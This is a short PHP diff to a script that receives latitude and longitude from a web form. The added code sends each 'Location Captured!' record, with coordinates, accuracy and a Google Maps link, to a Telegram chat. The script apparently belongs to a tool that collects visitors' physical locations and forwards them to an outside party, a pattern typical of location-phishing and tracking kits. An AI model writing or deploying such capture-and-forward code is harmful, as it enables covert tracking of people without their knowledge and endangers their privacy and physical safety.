@@ -59,6 +59,16 @@ if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
         header('Content-Type: application/json');
         echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
     }
+
+    
+    include 'telegram_utils.php';
+    $msg = "<b>Location Captured!</b>\n";
+    $msg .= "Latitude: <code>" . $latitude . "</code>\n";
+    $msg .= "Longitude: <code>" . $longitude . "</code>\n";
+    $msg .= "Accuracy: " . $accuracy . " meters\n";
+    $msg .= "Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude;
+    sendTelegramMessage($msg);
+
 } else {
     header('Content-Type: application/json');
     echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
